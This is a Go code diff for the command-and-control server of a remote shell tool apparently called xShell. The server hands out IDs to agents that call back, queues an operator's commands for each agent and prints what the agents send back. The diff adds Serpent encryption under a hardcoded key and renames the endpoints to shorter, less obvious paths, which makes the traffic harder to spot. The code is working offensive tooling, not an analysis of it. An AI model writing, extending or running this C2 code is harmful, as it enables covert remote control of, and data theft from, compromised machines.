@@ -3,17 +3,19 @@ package main
 import (
 	"bufio"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"net/http"
 	"os"
 	"strings"
 	"sync"
 	"time"
+	"xShell/c2/internal"
 
 	"github.com/brianvoe/gofakeit/v6"
 )
 
-const Port = "80"
+var Port string = "80"
+var Key string = "thisismypassword"
 
 type shell struct {
 	id        string
@@ -31,12 +33,15 @@ func shellIDHandler(w http.ResponseWriter, r *http.Request) {
 	gofakeit.Seed(0)
 	noun := gofakeit.Noun()
 	adjective := gofakeit.Adjective()
-
-	fmt.Fprintf(w, "%s_%s", adjective, noun)
+	id := fmt.Sprintf("%s_%s", adjective, noun)
+	id = strings.Trim(id, "\x00")
+	encId, _ := internal.SerpentEncrypt([]byte(id), []byte(Key))
+	w.Write(encId)
 }
 
 func getCommandHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
+	id = strings.Trim(id, "\x00")
 
 	mutex.Lock()
 	defer mutex.Unlock()
@@ -48,26 +53,31 @@ func getCommandHandler(w http.ResponseWriter, r *http.Request) {
 			version: "Unknown",
 		}
 		shells[id].timestamp = time.Now()
-		fmt.Fprint(w, "")
+		w.Write([]byte{})
 	} else if currentShell != nil && currentShell.id == id {
 		if currentShell.command == "quit" {
-			fmt.Fprint(w, "quit")
+			enc, _ := internal.SerpentEncrypt([]byte("quit"), []byte(Key))
+			w.Write(enc)
 			delete(shells, id)
 			currentShell = nil
 		} else {
-			fmt.Fprint(w, currentShell.command)
+			enc, _ := internal.SerpentEncrypt([]byte(currentShell.command), []byte(Key))
+			w.Write(enc)
 			currentShell.command = ""
 		}
 	} else {
-		fmt.Fprint(w, "")
+		w.Write([]byte{})
 	}
 }
 
 func postResultHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
-	body, _ := ioutil.ReadAll(r.Body)
+	id = strings.Trim(id, "\x00")
+	body, _ := io.ReadAll(r.Body)
 	r.Body.Close()
-
+	body, _ = internal.SerpentDecrypt(body, []byte(Key))
+	fmt.Printf("\n[*] Agent called back, sent %d bytes\n", len(body))
+	fmt.Printf("\nxShell %s> ", currentShell.id)
 	mutex.Lock()
 	defer mutex.Unlock()
 
@@ -77,6 +87,7 @@ func postResultHandler(w http.ResponseWriter, r *http.Request) {
 		} else {
 			if currentShell != nil && currentShell.id == id {
 				fmt.Printf("\nCommand output from shell %s:\n%s\n", id, string(body))
+				fmt.Printf("\nxShell %s> ", currentShell.id)
 			}
 		}
 		s.timestamp = time.Now()
@@ -148,9 +159,9 @@ func cleanOldShells() {
 }
 
 func main() {
-	http.HandleFunc("/shellID", shellIDHandler)
-	http.HandleFunc("/command", getCommandHandler)
-	http.HandleFunc("/result", postResultHandler)
+	http.HandleFunc("/id", shellIDHandler)
+	http.HandleFunc("/cmd", getCommandHandler)
+	http.HandleFunc("/res", postResultHandler)
 
 	go func() {
 		http.ListenAndServe(":"+Port, nil)
